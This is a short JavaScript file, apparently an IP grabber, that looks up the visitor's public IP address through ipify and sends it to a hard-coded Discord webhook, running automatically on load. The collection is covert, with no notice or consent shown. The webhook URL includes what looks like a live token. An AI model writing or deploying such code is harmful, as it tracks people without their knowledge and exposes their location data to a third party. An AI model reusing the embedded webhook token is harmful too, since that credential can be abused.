async function getUserIP() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
}

async function sendToWebhook(ip) {
    const webhookURL = 'https://discord.com/api/webhooks/1391300085341618299/eEiwWNdeasnHJMmn9adAbaRDRYDdbzr74WoxgoRef7Jw1VbYcD8OyM9w2C_QW-G_fPgA';
    const message = {
        content: `New IP logged: ${ip}`
    };

    await fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
}

async function logIP() {
    const ip = await getUserIP();
    await sendToWebhook(ip);
}

logIP();
